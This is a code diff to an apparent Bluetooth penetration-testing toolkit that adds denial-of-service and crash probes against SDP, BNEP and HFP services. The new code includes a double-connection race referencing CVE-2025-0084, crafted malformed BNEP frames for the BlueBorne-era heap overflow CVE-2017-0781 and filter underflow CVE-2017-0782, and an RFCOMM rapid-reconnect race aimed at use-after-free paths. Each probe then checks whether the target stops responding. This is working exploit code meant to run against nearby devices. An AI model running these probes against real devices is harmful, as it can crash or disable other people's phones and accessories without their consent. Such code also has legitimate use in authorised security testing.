@@ -24,6 +24,10 @@ import struct
 import time
 from typing import Any
 
+from blue_tap.fuzz.protocols.bnep import (
+    build_setup_connection_req as _bnep_setup_req,
+    fuzz_filter_overflow as _bnep_filter_overflow_cases,
+)
 from blue_tap.utils.output import info, success, warning, error
 from blue_tap.utils.bt_helpers import run_cmd
 
@@ -52,6 +56,7 @@ DTD_UINT32 = 0x0A
 # Well-known PSMs
 PSM_SDP = 0x0001
 PSM_RFCOMM = 0x0003
+PSM_BNEP = 0x000F
 
 # RFCOMM frame types
 RFCOMM_SABM = 0x2F
@@ -452,6 +457,20 @@ class SDPDoS:
                   + attrs + continuation)
         return self._build_sdp_pdu(SDP_SERVICE_SEARCH_ATTR_REQ, tid, params)
 
+    def _probe_sdp_reachable(self, timeout: float = 2.0) -> tuple[bool, str]:
+        try:
+            sock = _l2cap_connect(self.target, PSM_SDP, self.hci)
+            sock.settimeout(timeout)
+            pdu = self._build_service_search_attr_req([0x0100], max_bytes=32, tid=0x33)
+            sock.send(pdu)
+            resp = sock.recv(512)
+            sock.close()
+            if resp:
+                return True, f"follow-up SDP response len={len(resp)}"
+            return False, "follow-up SDP probe got empty response"
+        except OSError as exc:
+            return False, f"follow-up SDP probe failed: {exc}"
+
     def continuation_exhaustion(self,
                                 connections: int = 10) -> dict[str, Any]:
         """Exhaust SDP server continuation state table.
@@ -518,6 +537,84 @@ class SDPDoS:
         return _make_result(self.target, "continuation_exhaustion",
                             packets_sent, start_time, result_str,
                             f"{len(sockets)} connections established")
+
+    def double_connection_hfp_race(self, attempts: int = 3,
+                                   close_delay: float = 0.05,
+                                   service_uuid: int = 0x111E) -> dict[str, Any]:
+        """Trigger the Android SDP discovery double-connection race.
+
+        Opens two SDP connections, sends ServiceSearchAttributeRequest on both,
+        closes the first mid-processing, then checks whether SDP remains alive.
+        This follows the Class D path documented for CVE-2025-0084.
+        """
+        info(f"SDP double-connection race against {self.target} "
+             f"({attempts} attempts, close_delay={close_delay:.3f}s)")
+        start_time = time.time()
+        packets_sent = 0
+
+        for attempt in range(1, attempts + 1):
+            sock1 = None
+            sock2 = None
+            try:
+                sock1 = _l2cap_connect(self.target, PSM_SDP, self.hci)
+                sock2 = _l2cap_connect(self.target, PSM_SDP, self.hci)
+                req1 = self._build_service_search_attr_req([service_uuid], max_bytes=96, tid=(attempt * 2) - 1)
+                req2 = self._build_service_search_attr_req([service_uuid], max_bytes=96, tid=(attempt * 2))
+                sock1.send(req1)
+                sock2.send(req2)
+                packets_sent += 2
+
+                time.sleep(max(close_delay, 0.0))
+                try:
+                    sock1.close()
+                except OSError:
+                    pass
+                sock1 = None
+
+                try:
+                    sock2.settimeout(1.5)
+                    sock2.recv(1024)
+                except TimeoutError:
+                    pass
+                except OSError:
+                    pass
+
+                alive, evidence = self._probe_sdp_reachable(timeout=1.5)
+                if not alive:
+                    return _make_result(
+                        self.target,
+                        "sdp_double_connection_hfp_race",
+                        packets_sent,
+                        start_time,
+                        "target_unresponsive",
+                        f"attempt={attempt}; {evidence}",
+                    )
+            except OSError as exc:
+                return _make_result(
+                    self.target,
+                    "sdp_double_connection_hfp_race",
+                    packets_sent,
+                    start_time,
+                    "target_unresponsive",
+                    f"attempt={attempt}; connection race failed: {exc}",
+                )
+            finally:
+                for sock in (sock1, sock2):
+                    if sock is not None:
+                        try:
+                            sock.close()
+                        except OSError:
+                            pass
+            time.sleep(0.2)
+
+        return _make_result(
+            self.target,
+            "sdp_double_connection_hfp_race",
+            packets_sent,
+            start_time,
+            "success",
+            f"{attempts} double-connection attempt(s) completed without SDP outage",
+        )
 
     def large_service_search(self, count: int = 100) -> dict[str, Any]:
         """Send computationally expensive SDP search requests.
@@ -709,6 +806,121 @@ class RFCOMMDoS:
         success(f"SABM flood complete: {packets_sent} frames sent")
         return _make_result(self.target, "sabm_flood", packets_sent,
                             start_time, "success")
+
+
+# ===========================================================================
+# BNEP DoS
+# ===========================================================================
+
+class BNEPDoS:
+    """BNEP-specific crash probes for BlueBorne-era vulnerabilities."""
+
+    def __init__(self, target: str, hci: str = "hci0"):
+        self.target = target
+        self.hci = hci
+
+    def _send_followup_setup(self, sock: socket.socket) -> tuple[bool, str]:
+        followup = _bnep_setup_req(uuid_size=2)
+        sock.send(followup)
+        sock.settimeout(2.0)
+        resp = sock.recv(512)
+        if resp:
+            return True, f"follow-up setup response len={len(resp)}"
+        return False, "follow-up setup returned no data"
+
+    def heap_overflow_probe(self, attempts: int = 3, extra_size: int = 8) -> dict[str, Any]:
+        """CVE-2017-0781 near-boundary BNEP oversized-UUID crash probe."""
+        info(f"BNEP oversized-UUID probe against {self.target} ({attempts} attempts)")
+        start_time = time.time()
+        packets_sent = 0
+        malformed = bytes([0x81, 0x01, 0x10]) + b"\xFF" * 32 + (b"\x41" * max(extra_size, 1))
+
+        for attempt in range(1, attempts + 1):
+            sock = None
+            try:
+                sock = _l2cap_connect(self.target, PSM_BNEP, self.hci)
+                sock.send(malformed)
+                packets_sent += 1
+                time.sleep(0.05)
+                _, evidence = self._send_followup_setup(sock)
+                packets_sent += 1
+            except (OSError, TimeoutError) as exc:
+                return _make_result(
+                    self.target,
+                    "bnep_heap_overflow_probe",
+                    packets_sent,
+                    start_time,
+                    "target_unresponsive",
+                    f"attempt={attempt}; {exc}",
+                )
+            finally:
+                if sock is not None:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+
+        return _make_result(
+            self.target,
+            "bnep_heap_overflow_probe",
+            packets_sent,
+            start_time,
+            "success",
+            f"{attempts} BNEP oversized-UUID probe(s) completed without connection loss",
+        )
+
+    def filter_underflow_probe(self, attempts: int = 3) -> dict[str, Any]:
+        """CVE-2017-0782 BNEP filter length underflow crash probe."""
+        info(f"BNEP filter-underflow probe against {self.target} ({attempts} attempts)")
+        start_time = time.time()
+        packets_sent = 0
+        malformed = next(
+            frame for frame in _bnep_filter_overflow_cases()
+            if frame[:4] == bytes([0x01, 0x03, 0xFF, 0xFF])
+        )
+
+        for attempt in range(1, attempts + 1):
+            sock = None
+            try:
+                sock = _l2cap_connect(self.target, PSM_BNEP, self.hci)
+                baseline = _bnep_setup_req(uuid_size=2)
+                sock.send(baseline)
+                packets_sent += 1
+                try:
+                    sock.settimeout(1.0)
+                    sock.recv(256)
+                except (TimeoutError, OSError):
+                    pass
+
+                sock.send(malformed)
+                packets_sent += 1
+                time.sleep(0.05)
+                _, evidence = self._send_followup_setup(sock)
+                packets_sent += 1
+            except (OSError, TimeoutError) as exc:
+                return _make_result(
+                    self.target,
+                    "bnep_filter_underflow_probe",
+                    packets_sent,
+                    start_time,
+                    "target_unresponsive",
+                    f"attempt={attempt}; {exc}",
+                )
+            finally:
+                if sock is not None:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+
+        return _make_result(
+            self.target,
+            "bnep_filter_underflow_probe",
+            packets_sent,
+            start_time,
+            "success",
+            f"{attempts} BNEP filter-underflow probe(s) completed without connection loss",
+        )
 
     def credit_exhaustion(self) -> dict[str, Any]:
         """Open RFCOMM session with zero credits.
@@ -1103,6 +1315,20 @@ class HFPDoS:
         self.target = target
         self.hci = hci
 
+    def _resolve_channel(self, channel: int | None = None) -> int | None:
+        if channel:
+            return channel
+        try:
+            from blue_tap.recon.sdp import browse_services, find_service_channel
+
+            services = browse_services(self.target, hci=self.hci)
+            resolved = find_service_channel(self.target, "Hands-Free", services)
+            if resolved:
+                return resolved
+            return find_service_channel(self.target, "HFP", services)
+        except Exception:
+            return None
+
     def at_command_flood(self, channel: int = 10,
                          count: int = 5000) -> dict[str, Any]:
         """Flood AT commands after SLC setup.
@@ -1270,6 +1496,84 @@ class HFPDoS:
         return _make_result(self.target, "slc_state_confusion", packets_sent,
                             start_time, "success",
                             f"{len(confusion_commands)} out-of-order AT commands")
+
+    def rapid_reconnect_race(self, channel: int | None = None,
+                             attempts: int = 10,
+                             reconnect_delay: float = 0.02) -> dict[str, Any]:
+        """Post-pairing RFCOMM reconnect race for HFP client UAF paths."""
+        resolved_channel = self._resolve_channel(channel)
+        info(f"HFP rapid reconnect race against {self.target} "
+             f"(channel={resolved_channel or 'auto'}, attempts={attempts})")
+        start_time = time.time()
+        packets_sent = 0
+
+        if not resolved_channel:
+            return _make_result(
+                self.target,
+                "hfp_rapid_reconnect_race",
+                0,
+                start_time,
+                "error",
+                "Could not resolve HFP RFCOMM channel via SDP",
+            )
+
+        for attempt in range(1, attempts + 1):
+            sock = None
+            verify = None
+            try:
+                sock = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM, BTPROTO_RFCOMM)
+                sock.settimeout(5)
+                sock.connect((self.target, resolved_channel))
+                packets_sent += 1
+                try:
+                    sock.send(b"AT+BRSF=0\r")
+                    packets_sent += 1
+                except OSError:
+                    pass
+                time.sleep(max(reconnect_delay, 0.0))
+                sock.close()
+                sock = None
+                time.sleep(max(reconnect_delay, 0.0))
+
+                verify = socket.socket(AF_BLUETOOTH, socket.SOCK_STREAM, BTPROTO_RFCOMM)
+                verify.settimeout(3)
+                verify.connect((self.target, resolved_channel))
+                packets_sent += 1
+                verify.close()
+                verify = None
+            except OSError as exc:
+                if sock is not None:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+                if verify is not None:
+                    try:
+                        verify.close()
+                    except OSError:
+                        pass
+                result_code = "error" if attempt == 1 else "target_unresponsive"
+                note_prefix = (
+                    "Precondition failed: existing bond or active pairing may be required; "
+                    if attempt == 1 else ""
+                )
+                return _make_result(
+                    self.target,
+                    "hfp_rapid_reconnect_race",
+                    packets_sent,
+                    start_time,
+                    result_code,
+                    f"{note_prefix}attempt={attempt}; reconnect failed on channel {resolved_channel}: {exc}",
+                )
+
+        return _make_result(
+            self.target,
+            "hfp_rapid_reconnect_race",
+            packets_sent,
+            start_time,
+            "success",
+            f"{attempts} rapid reconnect cycle(s) completed on RFCOMM channel {resolved_channel}",
+        )
 
 
 # ===========================================================================
